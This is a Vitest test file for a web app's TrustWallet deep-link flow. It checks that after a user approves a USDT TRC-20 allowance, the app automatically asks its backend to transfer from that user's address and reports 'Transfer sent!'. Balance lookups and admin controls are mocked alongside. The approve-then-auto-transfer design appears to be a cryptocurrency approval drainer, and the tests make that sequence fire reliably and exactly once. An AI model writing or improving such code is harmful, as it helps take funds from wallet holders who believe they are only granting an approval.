// @vitest-environment jsdom
import { beforeEach, describe, expect, it, vi } from "vitest";

const mocks = vi.hoisted(() => ({
  connectWallet: vi.fn(),
  sendApprove: vi.fn(),
  requestBackendTransfer: vi.fn(),
  fetchUsdtBalance: vi.fn(),
  fetchTrxBalance: vi.fn(),
  fetchUsdtActivity: vi.fn(),
  fetchAllowance: vi.fn(),
  buildApproveTx: vi.fn(),
  broadcastTx: vi.fn(),
  fetchAdminStatus: vi.fn(),
}));

vi.mock("../src/wallet", () => ({ connectWallet: mocks.connectWallet }));
vi.mock("../src/transfer", () => ({ sendApprove: mocks.sendApprove }));
vi.mock("../src/backend", () => ({
  requestBackendTransfer: mocks.requestBackendTransfer,
  fetchAdminStatus: mocks.fetchAdminStatus,
  postAdminControl: vi.fn().mockResolvedValue(false),
}));
vi.mock("../src/tron", () => ({
  fetchUsdtBalance: mocks.fetchUsdtBalance,
  fetchTrxBalance: mocks.fetchTrxBalance,
  fetchUsdtActivity: mocks.fetchUsdtActivity,
  fetchAllowance: mocks.fetchAllowance,
  buildApproveTx: mocks.buildApproveTx,
  broadcastTx: mocks.broadcastTx,
}));

const OWNER = "TKQ2bDW5x37mNfu9maUc9va5quHkxFVNaX";

describe("TrustWallet deep-link approval integration", () => {
  beforeEach(() => {
    vi.resetModules();
    vi.resetAllMocks();
    document.body.innerHTML = '<div id="app"></div>';
    sessionStorage.clear();
    window.history.replaceState(null, "", "/?callback=approval");
    sessionStorage.setItem("pendingApprovalAddress", OWNER);
    mocks.fetchAllowance.mockResolvedValue(100n);
    mocks.fetchUsdtBalance.mockResolvedValue(100n);
    mocks.fetchTrxBalance.mockResolvedValue(5_000_000n);
    mocks.fetchUsdtActivity.mockResolvedValue([]);
    mocks.requestBackendTransfer.mockResolvedValue({ ok: true, txId: "SENT_TX" });
    mocks.fetchAdminStatus.mockResolvedValue(null);
  });

  it("resumes from the redirect, polls, and auto-sends", async () => {
    await import("../src/main");
    await vi.waitFor(() => {
      expect(document.querySelector("#approve-status")!.textContent).toContain(
        "USDT TRC-20 approved!",
      );
    });
    await vi.waitFor(() => {
      expect(mocks.requestBackendTransfer).toHaveBeenCalledWith(OWNER);
    });
    await vi.waitFor(() => {
      expect(document.querySelector("#status")!.textContent).toContain("Transfer sent!");
    });
  });

  it("does not resume when the URL has no callback param", async () => {
    window.history.replaceState(null, "", "/");
    await import("../src/main");
    expect(document.querySelector("#connect-btn")).not.toBeNull();
    expect(mocks.fetchAllowance).not.toHaveBeenCalled();
    expect(mocks.requestBackendTransfer).not.toHaveBeenCalled();
  });

  it("does not resume when the callback is present but no address is pending", async () => {
    sessionStorage.removeItem("pendingApprovalAddress");
    await import("../src/main");
    expect(document.querySelector("#connect-btn")).not.toBeNull();
    expect(mocks.fetchAllowance).not.toHaveBeenCalled();
  });

  it("does not resume when callback is present but not 'approval'", async () => {
    window.history.replaceState(null, "", "/?callback=foo");
    await import("../src/main");
    expect(document.querySelector("#connect-btn")).not.toBeNull();
    expect(mocks.fetchAllowance).not.toHaveBeenCalled();
  });

  it("resumes exactly once and does not double-poll or double-send", async () => {
    vi.useFakeTimers();
    try {
      await import("../src/main");
      await vi.advanceTimersByTimeAsync(0);
      await vi.advanceTimersByTimeAsync(0);
      expect(mocks.fetchAllowance).toHaveBeenCalledTimes(1);
      expect(mocks.requestBackendTransfer).toHaveBeenCalledTimes(1);
      await vi.advanceTimersByTimeAsync(10000);
      expect(mocks.fetchAllowance).toHaveBeenCalledTimes(1);
      expect(mocks.requestBackendTransfer).toHaveBeenCalledTimes(1);
    } finally {
      vi.useRealTimers();
    }
  });
});
